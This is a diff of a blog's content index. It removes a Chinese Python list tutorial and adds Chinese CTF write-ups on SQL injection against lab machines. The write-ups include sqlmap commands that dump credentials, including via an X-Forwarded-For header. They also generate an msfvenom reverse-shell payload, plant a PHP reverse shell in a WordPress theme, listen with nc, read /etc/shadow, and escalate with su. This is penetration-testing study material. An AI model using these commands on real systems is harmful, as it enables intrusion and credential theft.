-<h1 id="1-列表"><a href="#1-列表" class="headerlink" title="1. 列表"></a>1. 列表</h1><h2 id="1-1-列表是什么及其创建"><a href="#1-1-列表是什么及其创建" class="headerlink" title="1.1 列表是什么及其创建"></a>1.1 列表是什么及其创建</h2><p><strong>列表</strong>是由一系列按特定顺序排列的元素的组成。包括你不仅可以创建包含字⺟表中所有字⺟、数字 0~9 或所有家庭成员姓名的列表，还可以将任何东西加⼊列表，其中的元素之间可以没有任何关系。列表通常包含多个元素，因此给列表指定⼀个表⽰复数的名称（如 letters、digits 或 names）是个不错的主意。<br>你可以把列表理解为C语言中的数组，但是Python的列表是一个更宏观的概念，它可以包括你想到的任何数据内容。<br>Python中，列表用中括号<code>[]</code>表示，用逗号分割其中的元素（ps：这里都是指英文半角下的符号，不能用中文符号，不然就会报错）。<br>举个例子：<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251541693.png"
-                      alt="image.png"
-                ><br>可以看到：Python 将打印列表的内部表⽰，<strong>包括⽅括号。</strong></p>
-<hr>
-<h2 id="1-2-列表的相关操作"><a href="#1-2-列表的相关操作" class="headerlink" title="1.2 列表的相关操作"></a>1.2 列表的相关操作</h2><h3 id="1-2-1-列表索引访问"><a href="#1-2-1-列表索引访问" class="headerlink" title="1.2.1 列表索引访问"></a>1.2.1 列表索引访问</h3><h4 id="单个索引访问"><a href="#单个索引访问" class="headerlink" title="单个索引访问"></a>单个索引访问</h4><p>列表是一个有序集合，也就是说其中的元素并不是无序的，每个元素都有自己的位置，也就是[[#前言]]说的<code>索引</code>。我们要访问列表中的某一个位置，可以直接告诉Python这个位置的索引（我们说的第n个元素或位置，其索引要减去1，也就是索引为n-1）。要访问列表元素，可以指出列表的名称加上元素索引，索引要放在中括号内。<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251542461.png"
-                      alt="image.png"
-                ></p>
-<blockquote>
-<p>图片来源：菜鸟教程</p>
-</blockquote>
-<p>举个例子：<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251543939.png"
-                      alt="image.png"
-                ></p>
-<p>这里有个特殊的方法，可以让你返回列表中的最后一个元素，无论列表的长度是多少，你都可以用索引<code>-1</code>来表示列表的最后一个元素，以此类推，索引<code>-2</code>用来访问倒数第二个元素……，如下：<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251550715.png"
-                      alt="image.png"
-                ></p>
-<p><em>ps：访问的索引不能超过列表最后一个元素的索引，这样将会直接导致报错。只要列表不为空，索引<code>-1</code>来访问列表最后一个元素都有效</em></p>
-<h4 id="索引切片访问"><a href="#索引切片访问" class="headerlink" title="索引切片访问"></a>索引切片访问</h4><p>可以利用<code>[]</code>和<code>:</code>来确定一个索引范围来进行切片，就是对列表的某一段切出来进行打印。<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251708866.png"
-                      alt="image.png"
-                ></p>
-<blockquote>
-<p>图片来源：菜鸟教程</p>
-</blockquote>
-<p>注意：这里<code>:</code>右边的索引是不会被取到的，如下的<code>1:4</code>,是取不到索引为4的位置的元素。<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251658095.png"
-                      alt="image.png"
-                ></p>
-<p>同样，也可以用负数索引来表示倒数第几个元素<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251658968.png"
-                      alt="image.png"
-                ></p>
-<p>有一种特殊情况，在<code>:</code>的左右两边是可以不加索引值的，意思是直接取到头，比如<code>2:</code>，表示从索引为2的（第三个）的元素取到最后一个（包括最后一个）。在前面切片范围的<code>:</code>之后还可以添加一个<code>:</code>，表示步长，所谓步长可以理解为等差数列的公差，就是隔一个步长取一个元素。<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251704005.png"
-                      alt="image.png"
-                ></p>
-<p>你也可以用标准化输出来使用列表中的值，也就是第一章的<code>f</code>标准化输出<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251643872.png"
-                      alt="image.png"
-                ></p>
-<h3 id="1-2-2-列表的修改、添加、删除"><a href="#1-2-2-列表的修改、添加、删除" class="headerlink" title="1.2.2 列表的修改、添加、删除"></a>1.2.2 列表的修改、添加、删除</h3><p>Python的列表一般是动态的，也就是你可以对其中的某些元素进行一些操作来改变列表。比如当以后你自己做一个项目的适合，你自己做了一个游戏，游戏中有一些怪物，怪物是用一个列表存储的，当你消灭了一个怪物，这个怪物就会从列表中删除，相应的，当你通过一个关卡，列表中的怪物也会进行更新。</p>
-<h4 id="列表的修改"><a href="#列表的修改" class="headerlink" title="列表的修改"></a>列表的修改</h4><p>列表的修改十分简单，只是利用赋值运算符对某个索引位置的元素进行覆盖赋值。如下：<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251710937.png"
-                      alt="image.png"
-                ></p>
-<h4 id="列表的添加和删除（更新）"><a href="#列表的添加和删除（更新）" class="headerlink" title="列表的添加和删除（更新）"></a>列表的添加和删除（更新）</h4><p>列表的添加是一个很重要的操作，你可以用来更新你的列表数据，以达到你的目标要求。</p>
-<p>首先介绍一下队列：队列是一种先进先出（FIFO）的数据结构，我们可以使用列表来实现队列的基本功能。我们都知道在一个地方排队，是要从队伍末尾开始排的（不考虑没素质的人）。这样我们列表基本的添加和删除都是在列表的末尾进行操作的</p>
-<h5 id="append-函数"><a href="#append-函数" class="headerlink" title="append()函数"></a>append()函数</h5><p><strong>函数语法：<code>list.append(obj)</code></strong><br>首先来介绍列表的内置函数，可以把一个列表看成一个队列，这个append()函数也是满足队列的条件，是在列表的末尾进行添加。<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251720596.png"
-                      alt="image.png"
-                ></p>
-<h5 id="pop-函数"><a href="#pop-函数" class="headerlink" title="pop()函数"></a>pop()函数</h5><p><strong>函数语法：<code>list.pop([index=-1])</code></strong><br><em>ps：pop()的默认参数就是最后一个索引，一般不自主选择（当然也可以自己选择索引）。这里需要注意，pop()函数是有返回值的，返回值就是你选择删除的数据，可以理解为一个抽象的栈，把数据从栈里面弹出来</em><br><code>pop()</code>函数是和<code>append()</code>函数相对的，这个函数是将列表的最后一个元素删除。</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251724325.png"
-                      alt="image.png"
-                ><br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251841067.png"
-                      alt="image.png"
-                ></p>
-<h5 id="insert-函数"><a href="#insert-函数" class="headerlink" title="insert()函数"></a>insert()函数</h5><p><strong>函数语法：<code>list.insert(index, obj)</code></strong><br>    <em>ps：- index – 对象 obj 需要插入的索引位置     - obj – 要插入列表中的对象。</em><br>这个函数字面意思就是插入，你可以插入数据到列表的任意一个地方，你甚至可以插入一个列表，这就是列表的嵌套。当你插入一个数据后，后面的所有数据都会向后移一个位置，也就是索引加一<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251831764.png"
-                      alt="image.png"
-                ></p>
-<h5 id="del语句"><a href="#del语句" class="headerlink" title="del语句"></a>del语句</h5><p><strong>语法：<code>del list[index]</code></strong><br><code>del</code><em>不是</em><code>python3</code> 中的<strong>内置函数</strong>，<code>del</code>只是一个关键字，就跟<code>import</code>和<code>return</code>一样<br>del也是可以删除列表中任意位置的数据，你只需要知道数据的索引即可<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251838748.png"
-                      alt="image.png"
-                ></p>
-<h5 id="比较del和pop"><a href="#比较del和pop" class="headerlink" title="比较del和pop()"></a>比较del和pop()</h5><p>当你想要删除数据时该如何选择呢？这个其实很简单，当你想要直接删除数据并且不想再使用这个数据时，你就可以用del语句，直接将数据清楚；当然你也可以用pop()函数，但是不用一个变量来保存这个删除的数据，也就相当于直接删除。如果你想要将数据从列表中取出来，并且要将这个数据用以其他操作，那么你就只能用pop()函数。</p>
-<h5 id="remove-函数"><a href="#remove-函数" class="headerlink" title="remove()函数"></a>remove()函数</h5><p>有时候，你不知道要从列表中删除的值在哪个位置。如果只知道要删除的元素的值，可使⽤ <code>remove()</code> ⽅法。<br><em>ps：<code>remove()</code>函数只会删除第一个满足条件的数据，也就是当找到了第一个需要删除的元素，他就停止寻找了。如果想要删除更多或者全部相同元素，就需要使用循环，这将在后面循环结构的一章进行讲解</em><br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251857448.png"
-                      alt="image.png"
-                ></p>
-<h4 id="列表的排序"><a href="#列表的排序" class="headerlink" title="列表的排序"></a>列表的排序</h4><h5 id="sort-函数"><a href="#sort-函数" class="headerlink" title="sort()函数"></a>sort()函数</h5><p><strong>函数语法：<code>list.sort(cmp=None, key=None, reverse=False)</code></strong></p>
-<ul>
-<li>cmp – 可选参数, 如果指定了该参数会使用该参数的方法进行排序。</li>
-<li>key – 主要是用来进行比较的元素，只有一个参数，具体的函数的参数就是取自于可迭代对象中，指定可迭代对象中的一个元素来进行排序。</li>
-<li>reverse – 排序规则，reverse &#x3D; True 降序， reverse &#x3D; False 升序（默认）。</li>
-</ul>
-<p>Python有一个内置函数，可以对列表轻松的进行排序。值得注意的是，<code>sort()</code>函数不止对数字进行排序，也可以对字母进行排序。如下：<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251911202.png"
-                      alt="image.png"
-                ></p>
-<p>当然也可以对列表进行逆序，只需要加上参数<code>reverse = True</code><br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251923030.png"
-                      alt="image.png"
-                ></p>
-<h5 id="sorted-函数"><a href="#sorted-函数" class="headerlink" title="sorted()函数"></a>sorted()函数</h5><p><code>sort()</code>函数使用之后，列表的顺序就会被永久改变，如果想要进行临时排序，就可以使用<code>sorted()</code>函数<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251931129.png"
-                      alt="image.png"
-                ><br>在调⽤ <code>sorted()</code> 函数后，列表元素的排列顺序并没有变<br>如果要按与字⺟顺序相反的顺序显⽰列表，也可向 <code>sorted()</code> 函数 传递参数 <code>reverse=True</code></p>
-<p><em>ps：在并⾮所有的值都是全小写的时，按字⺟顺序排列列表要复杂⼀些。在确定排列顺序时，有多种解读⼤写字⺟的⽅式，此时要指定准确的排列顺序，可能会比这⾥所做的更加复杂。然而，大多数排序方式是以本节介绍的知识为基础的。</em></p>
-<h5 id="reverse-函数"><a href="#reverse-函数" class="headerlink" title="reverse()函数"></a>reverse()函数</h5><p>要反转列表元素的排列顺序，可使⽤ reverse() ⽅法。这里是将原列表的顺序进行反转，而不是排序后反转<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251934680.png"
-                      alt="image.png"
-                ></p>
-<h4 id="列表的其他操作"><a href="#列表的其他操作" class="headerlink" title="列表的其他操作"></a>列表的其他操作</h4><h5 id="count-函数"><a href="#count-函数" class="headerlink" title="count()函数"></a>count()函数</h5><p>这个函数是用来统计列表中某个数据出现的次数的<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251946234.png"
-                      alt="image.png"
-                ></p>
-<h5 id="extend-函数"><a href="#extend-函数" class="headerlink" title="extend()函数"></a>extend()函数</h5><p>在列表末尾一次性追加另一个序列中的多个值（用新列表扩展原来的列表）<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251946805.png"
-                      alt="image.png"
-                ></p>
-<h5 id="index-函数"><a href="#index-函数" class="headerlink" title="index()函数"></a>index()函数</h5><p>从列表中找出某个值第一个匹配项的索引位置<br><em>ps：如果在列表中有重复元素，只会索引到目标数据第一次出现的索引位置</em><br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251947793.png"
-                      alt="image.png"
-                ></p>
-<h5 id="copy-函数"><a href="#copy-函数" class="headerlink" title="copy()函数"></a>copy()函数</h5><p>将一个列表进行复制并返回该复制的列表<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251948401.png"
-                      alt="image.png"
-                ></p>
-<h5 id="clear-函数"><a href="#clear-函数" class="headerlink" title="clear()函数"></a>clear()函数</h5><p>将列表清空<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409251949806.png"
-                      alt="image.png"
-                ></p>
-<h3 id="1-2-3-Python列表脚本操作符"><a href="#1-2-3-Python列表脚本操作符" class="headerlink" title="1.2.3 Python列表脚本操作符"></a>1.2.3 Python列表脚本操作符</h3><p>列表对 <code>+</code> 和 <code>*</code> 的操作符与字符串相似。<code>+</code> 号用于组合列表，<code>*</code> 号用于重复列表。</p>
-<table>
-<thead>
-<tr>
-<th align="left">Python 表达式</th>
-<th align="left">结果</th>
-<th align="left">描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">len([1, 2, 3])</td>
-<td align="left">3</td>
-<td align="left">列表的长度</td>
-</tr>
-<tr>
-<td align="left">[1, 2, 3] + [4, 5, 6]</td>
-<td align="left">[1, 2, 3, 4, 5, 6]</td>
-<td align="left">组合</td>
-</tr>
-<tr>
-<td align="left">[‘Hi!’] * 4</td>
-<td align="left">[‘Hi!’, ‘Hi!’, ‘Hi!’, ‘Hi!’]</td>
-<td align="left">重复</td>
-</tr>
-<tr>
-<td align="left">3 in [1, 2, 3]</td>
-<td align="left">True</td>
-<td align="left">元素是否存在于列表中</td>
-</tr>
-<tr>
-<td align="left">for x in [1, 2, 3]: print(x, end&#x3D;” “)</td>
-<td align="left">1 2 3</td>
-<td align="left">迭代</td>
-</tr>
-<tr>
-<td align="left">max([1, 2, 3])</td>
-<td align="left">3</td>
-<td align="left">列表中的最大值</td>
-</tr>
-<tr>
-<td align="left">min([1, 2, 3])</td>
-<td align="left">1</td>
-<td align="left">列表中的最小值</td>
-</tr>
-</tbody></table>
-]]></content>
-      <categories>
-        <category>python</category>
-      </categories>
-      <tags>
-        <tag>python</tag>
       </tags>
   </entry>
   <entry>
@@ -647,6 +775,668 @@
 
 <p>More info: <a class="link"   href="https://hexo.io/docs/one-command-deployment.html" >Deployment <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 ]]></content>
+  </entry>
+  <entry>
+    <title>sql注入（IP命令行）</title>
+    <url>/2024/09/11/3bc19a255208/</url>
+    <content><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p><strong>SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。</strong></p>
+<p><strong>SQL注入的产生原因通常表现在以下几方面:①不当的类型处理;②不安全的数据库配置;③不合理的查询集处理;④不当的错误处理;⑤转义字符处理不合适;⑥多个提交处理不当。</strong></p>
+<h2 id="1-信息探测"><a href="#1-信息探测" class="headerlink" title="1.信息探测"></a>1.信息探测</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p- -T4 IP <span class="comment"># 探测端口</span></span><br><span class="line">namp -T4 -A -v IP <span class="comment"># 探测全部信息</span></span><br><span class="line">nikto -host http://ip:port</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="2-深入挖掘"><a href="#2-深入挖掘" class="headerlink" title="2.深入挖掘"></a>2.深入挖掘</h2><p>打开敏感页面 比如什么登录页面 &#x2F;admin&#x2F;login.php</p>
+<p>尝试弱口令登录，失败</p>
+<h2 id="3-漏洞扫描"><a href="#3-漏洞扫描" class="headerlink" title="3.漏洞扫描"></a>3.漏洞扫描</h2><blockquote>
+<p>web漏洞扫描器 owasp-zap<br>OWASP ZAP攻击代理服务器是世界上最受欢迎的免费安全工具之一。ZAP可以帮助您在开发和测试应用程序过程中，自动发现 Web应用程序中的安全漏洞。另外，它也是一款提供给具备丰富经验的渗透测试人员进行人工安全测试的优秀工具。</p>
+</blockquote>
+<p>输入ip进行attack，然后软件开始爬虫并扫描</p>
+<h2 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4.漏洞利用"></a>4.漏洞利用</h2><h3 id="4-1-发现高危漏洞sql注入"><a href="#4-1-发现高危漏洞sql注入" class="headerlink" title="4.1 发现高危漏洞sql注入"></a>4.1 发现高危漏洞sql注入</h3><p>对扫描结果进行分析，发现高危漏洞SQL注入</p>
+<p>利用sqlmap利用SQL注入漏洞</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u url # 查看是否具有sql注入</span><br><span class="line">sqlmap -u url --dbs # 查看数据库名</span><br><span class="line">sqlmap -u url -D &quot;数据库名&quot; --tables # 查看对应数据库中的数据表</span><br><span class="line">sqlmap -u url -D &quot;数据库名&quot; -T &quot;表名&quot; --columns # 查看对应字段/列 </span><br><span class="line">sqlmap -u url -D &quot;数据库名&quot; -T &quot;表名&quot; -C &quot;列名&quot; --dump # 查看对应字段的值</span><br><span class="line">sqlmap -u url -os -shell #尝试直接获取shell</span><br><span class="line"># 注：所有的名称可以用 &quot;,&quot; 隔开以获取多个值</span><br></pre></td></tr></table></figure></div>
+
+<p>查找到对应的用户名和密码，登录系统</p>
+<p>上传shell反弹权限</p>
+<p>生成反弹shell</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=攻击机IP lport=未使用的端口 -f raw</span><br></pre></td></tr></table></figure></div>
+
+<p>将生成的shell保存到php文件中</p>
+<p>监听</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 攻击机IP地址 </span><br><span class="line"><span class="built_in">set</span> lport 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>
+
+<p>然后上传webshell，实现反弹，获取flag</p>
+<h3 id="4-2-未发现高危漏洞"><a href="#4-2-未发现高危漏洞" class="headerlink" title="4.2 未发现高危漏洞"></a>4.2 未发现高危漏洞</h3><p>但是通过前面的信息探测发现了登陆界面 如 &#x2F;phpmyadmin &#x2F;login.php 等</p>
+<p>然后尝试弱口令登录，无法登录，想到利用post sql注入</p>
+<h4 id="4-2-1-抓取数据包"><a href="#4-2-1-抓取数据包" class="headerlink" title="4.2.1 抓取数据包"></a>4.2.1 抓取数据包</h4><p>利用bp抓取网页数据包，注意设置浏览器代理，然后将抓取的数据包保存到request.raw文件里</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r request.raw --level 5 --risk 3 --dbs --dbms mysql --batch</span><br><span class="line"># -r参数用于指定 SQLMap 工具所使用的 HTTP 请求文件</span><br><span class="line"># --level 5 表示最高级别的攻击。</span><br><span class="line"># --risk 3 表示非常高的风险。</span><br><span class="line"># --dbs: 这个选项表示 SQLMap 将尝试获取目标数据库的信息。</span><br><span class="line"># --dbms mysql: 这个选项指定了目标数据库管理系统的类型，这里是 MySQL。</span><br><span class="line"># --batch: 这个选项指定了在批处理模式下运行 SQLMap，即不需要用户交互。</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h4 id="4-2-2-进行sql注入"><a href="#4-2-2-进行sql注入" class="headerlink" title="4.2.2 进行sql注入"></a>4.2.2 进行sql注入</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r request.raw --level 5 --risk 3 -D wordpress8080 --tables --dbms mysql --batch</span><br></pre></td></tr></table></figure></div>
+
+
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r request.raw --level 5 --risk 3 -D wordpress8080 -T users --columns --dbms mysql --batch</span><br></pre></td></tr></table></figure></div>
+
+
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r request.raw --level 5 --risk 3 -D wordpress8080 -T users -C username,password --dbms mysql --batch</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>得到用户名和密码</p>
+<p>因为前面信息扫描出&#x2F;wordpress 目录，所以可以确定网站利用wordpress的CMS，然后wordpress的默认登录后台页面为</p>
+<p><code>/wordpress/wp-login.php</code></p>
+<p>输入用户名和密码，登陆后台。</p>
+<h4 id="4-2-3-反弹shell"><a href="#4-2-3-反弹shell" class="headerlink" title="4.2.3 反弹shell"></a>4.2.3 反弹shell</h4><p>然后也是上传webshell获得控制权</p>
+<p>利用自带的反弹shell</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> php-reverse-shell.php /root/Desktop/</span><br></pre></td></tr></table></figure></div>
+
+<p>然后将复制的shell进行修改，修改端口和ip为&#x3D;&#x3D;攻击机ip&#x3D;&#x3D;</p>
+<p>启动监听</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nc -nlvp port <span class="comment">#对应的端口4444</span></span><br></pre></td></tr></table></figure></div>
+
+<p>访问上传webshell的地址(上传到404页面)</p>
+<p>&#x3D;&#x3D;http:&#x2F;&#x2F;靶场IP:port&#x2F;目录&#x2F;wp-content&#x2F;themes&#x2F;主题名&#x2F;404.php&#x3D;&#x3D;</p>
+<p>成功反弹</p>
+<p>然后优化终端</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<h4 id="4-2-4-提权"><a href="#4-2-4-提权" class="headerlink" title="4.2.4 提权"></a>4.2.4 提权</h4><p>查看敏感文件</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/shadow </span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br></pre></td></tr></table></figure></div>
+
+<p>利用su提权</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">su -root</span><br></pre></td></tr></table></figure></div>
+
+<p>发现空密码无法提权，然后尝试前面获取的密码（和后台密码相同）</p>
+<p>提权成功</p>
+<p>然后到&#x2F;root目录获取flag</p>
+<h2 id="5-X-Forward-For-sql注入"><a href="#5-X-Forward-For-sql注入" class="headerlink" title="5. X-Forward-For sql注入"></a>5. X-Forward-For sql注入</h2><h3 id="5-1-漏洞扫描"><a href="#5-1-漏洞扫描" class="headerlink" title="5.1 漏洞扫描"></a>5.1 漏洞扫描</h3><p>&#x3D;&#x3D;漏洞扫描器 AVWS&#x3D;&#x3D;</p>
+<p>扫描出X-Forwarded-For sql注入</p>
+<h3 id="5-2-漏洞利用"><a href="#5-2-漏洞利用" class="headerlink" title="5.2 漏洞利用"></a>5.2 漏洞利用</h3><p>利用sqlmap</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://靶场IP&quot; --header=&quot;X-Forwarded-For:*&quot; --dbs --batch</span><br></pre></td></tr></table></figure></div>
+
+
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://靶场IP&quot; --header=&quot;X-Forwarded-For:*&quot; -D &quot;photoblog&quot; --tables --batch</span><br></pre></td></tr></table></figure></div>
+
+
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://靶场IP&quot; --header=&quot;X-Forwarded-For:*&quot; -D &quot;photoblog&quot; -T &quot;users&quot; --columns --batch</span><br></pre></td></tr></table></figure></div>
+
+
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://靶场IP&quot; --header=&quot;X-Forwarded-For:*&quot; -D &quot;photoblog&quot; -T &quot;users&quot; -C &quot;login,password&quot; --dump --batch</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>成功获取用户名和密码，登录到后台</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>sql</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sql注入（web界面）</title>
+    <url>/2024/09/11/f366e274d4aa/</url>
+    <content><![CDATA[<h1 id="sql注入（web界面）"><a href="#sql注入（web界面）" class="headerlink" title="sql注入（web界面）"></a>sql注入（web界面）</h1><p>进入mysql命令行</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">show databases; # 显示所有数据库</span><br><span class="line">use database_name; # 进入某个数据库</span><br><span class="line">show tables; # 显示所有表名</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="增删改查"><a href="#增删改查" class="headerlink" title="增删改查"></a>增删改查</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 向数据库插入数据</span><br><span class="line">insert into 表名(字段1,字段2,...) values(值1,值2,...);</span><br><span class="line"># example</span><br><span class="line">insert into guestbook(comment,name) values(&#x27;welcome&#x27;,&#x27;web&#x27;);</span><br><span class="line"></span><br><span class="line"># 修改数据库的数据</span><br><span class="line">update 表名 set 字段名=&quot;值&quot; [where 条件];</span><br><span class="line"># example</span><br><span class="line">update guestbook set comment = &#x27;I love study&#x27;;</span><br><span class="line">update guestbook set comment = &#x27;I love study&#x27; where name=&#x27;web14&#x27;;</span><br><span class="line"></span><br><span class="line"># 向数据库查询数据</span><br><span class="line">select * from 表名;</span><br><span class="line">select */字段 from 表名 [where 条件]; # *表示全部</span><br><span class="line"># example</span><br><span class="line">select * from guestbook;</span><br><span class="line">select name,comment from guestbook where comment_id=2;</span><br><span class="line"></span><br><span class="line"># 删除数据库的数据</span><br><span class="line">delete from 表名 where 条件; # 必须有where条件</span><br><span class="line"># example</span><br><span class="line">delete from guestbook where comment_id=2;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Information-schema数据库"><a href="#Information-schema数据库" class="headerlink" title="Information_schema数据库"></a>Information_schema数据库</h3><ol>
+<li><h3 id="CHARACTER-SETS-表"><a href="#CHARACTER-SETS-表" class="headerlink" title="CHARACTER_SETS 表"></a>CHARACTER_SETS 表</h3><p>提供了 mysql 可用字符集的信息。<code>SHOW CHARACTER SET;</code> 命令从这个表获取结果。</p>
+</li>
+<li><h3 id="SCHEMATA-表"><a href="#SCHEMATA-表" class="headerlink" title="&#x3D;&#x3D;SCHEMATA 表&#x3D;&#x3D;"></a>&#x3D;&#x3D;SCHEMATA 表&#x3D;&#x3D;</h3><p>&#x3D;&#x3D;当前 mysql 实例中所有数据库的信息。<code>SHOW DATABASES;</code> 命令从这个表获取数据。&#x3D;&#x3D;</p>
+</li>
+<li><h3 id="TABLES-表"><a href="#TABLES-表" class="headerlink" title="&#x3D;&#x3D;TABLES 表&#x3D;&#x3D;"></a>&#x3D;&#x3D;TABLES 表&#x3D;&#x3D;</h3><p>&#x3D;&#x3D;存储数据库中的表信息（包括视图），包括表属于哪个数据库，表的类型、存储引擎、创建时间等信息。<code>SHOW TABLES FROM XX;</code> 命令从这个表获取结果。&#x3D;&#x3D;</p>
+</li>
